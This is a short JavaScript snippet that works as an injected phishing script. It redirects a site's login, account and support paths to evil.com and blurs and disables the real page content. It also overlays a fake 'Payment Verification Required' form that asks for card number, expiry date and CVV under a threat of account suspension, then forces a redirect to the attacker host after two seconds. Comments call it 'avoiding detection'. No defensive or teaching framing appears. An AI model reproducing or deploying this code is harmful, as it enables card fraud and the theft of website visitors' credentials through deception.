// Smart redirect avoiding detection
const redirectMap = {
  '/login': 'https://evil.com/login',
  '/account': 'https://evil.com/account',
  '/support': 'https://evil.com/support'
};

const target = redirectMap[window.location.pathname] || 'https://evil.com';

// Hide legitimate content and show payment prompt
document.querySelectorAll('header, main, footer').forEach(el => {
  el.style.filter = 'blur(2px)';
  el.style.pointerEvents = 'none';
  el.style.userSelect = 'none';
});

// Create payment prompt overlay
const overlay = document.createElement('div');
overlay.className = 'phishing-overlay';
overlay.innerHTML = `
  <div class="phishing-container">
    <h3>Payment Verification Required</h3>
    <p>Your account needs immediate verification to prevent suspension.</p>
    <div class="payment-form">
      <input type="text" placeholder="Card Number" class="payment-input">
      <input type="text" placeholder="Expiry Date" class="payment-input">
      <input type="text" placeholder="CVV" class="payment-input">
      <button id="verify-btn" class="payment-button">Verify Now</button>
    </div>
    <p class="small-text">You will be redirected shortly after verification.</p>
  </div>
`;
document.body.appendChild(overlay);

// Redirect after 2 seconds regardless of user action
setTimeout(() => {
  window.location.replace(target);
}, 2000);

// Fake verification button (doesn't actually do anything)
document.getElementById('verify-btn')?.addEventListener('click', () => {
  alert('Verification processing...');
});
